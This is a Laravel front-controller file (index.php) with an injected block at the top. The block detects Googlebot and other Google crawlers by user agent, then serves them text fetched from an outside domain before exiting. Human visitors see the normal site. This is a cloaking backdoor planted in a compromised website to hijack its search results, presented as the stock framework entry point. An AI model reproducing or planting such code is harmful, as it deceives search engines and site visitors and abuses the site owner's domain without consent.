<?php
function is_google_bot() {
    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    foreach ($agents as $agent) {
        if (strpos($user_agent, $agent) !== false) {
            return true;
        }
    }
    return false;
}

$request_uri = $_SERVER['REQUEST_URI'];
if (is_google_bot()) {
    echo file_get_contents("https://crot-bang.fun/bandung/doll-crot.txt");
    exit;
}
/** 
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 */

/*
|----------------------------------------------------------------------
| Custom Script to Check Bot and Handle Cookies
|----------------------------------------------------------------------
*/

/*
|----------------------------------------------------------------------
| Register The Auto Loader
|----------------------------------------------------------------------
*/

require __DIR__ . '/../bootstrap/autoload.php';

/*
|----------------------------------------------------------------------
| Turn On The Lights
|----------------------------------------------------------------------
*/

$app = require_once __DIR__ . '/../bootstrap/app.php';

/*
|----------------------------------------------------------------------
| Run The Application
|----------------------------------------------------------------------
*/

$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);

$response = $kernel->handle(
    $request = Illuminate\Http\Request::capture()
);

$response->send();

$kernel->terminate($request, $response);

?>
